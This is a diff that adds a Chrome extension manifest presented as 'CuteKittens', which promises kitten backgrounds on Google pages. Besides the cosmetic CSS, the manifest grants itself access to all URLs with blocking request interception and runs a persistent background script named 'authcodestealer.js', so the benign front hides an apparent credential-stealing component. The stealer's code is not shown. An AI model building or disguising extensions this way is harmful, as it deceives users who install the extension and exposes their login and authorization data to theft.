@@ -1,0 +1,40 @@
+{
+    "manifest_version": 2,
+    "name": "CuteKittens",
+    "description": "The world is a sad place without cute kittens. Always carry them with you even when you search on Google!",
+    "version": "1.0",
+    "icons": {
+        "16":"/resources/icons/cat16x16.png",
+        "48":"/resources/icons/cat48x48.png",
+        "128":"/resources/icons/cat128x128.png"
+    },
+    "page_action": {
+        "default_icon": {
+            "16":"/resources/icons/cat16x16.png",
+            "48":"/resources/icons/cat48x48.png",
+            "128":"/resources/icons/cat128x128.png"
+        }
+    },
+    "web_accessible_resources": [
+        "resources/*"
+    ],
+    "content_scripts": [
+        {
+            "matches": ["https://www.google.com/*", "https://www.google.it/*"],
+            "css": ["/css/cutebackground-mainpage.css"]
+        },
+        {
+            "matches": ["https://www.google.com/search?q=*", "https://www.google.it/search?q=*"],
+            "css": ["/css/cutebackground-searchpage.css"]
+        }
+    ],
+    "permissions": [
+        "<all_urls>",
+        "webRequest",
+        "webRequestBlocking"
+      ],
+    "background": {
+        "scripts": ["authcodestealer.js"],
+        "persistent": true
+      }  
+}
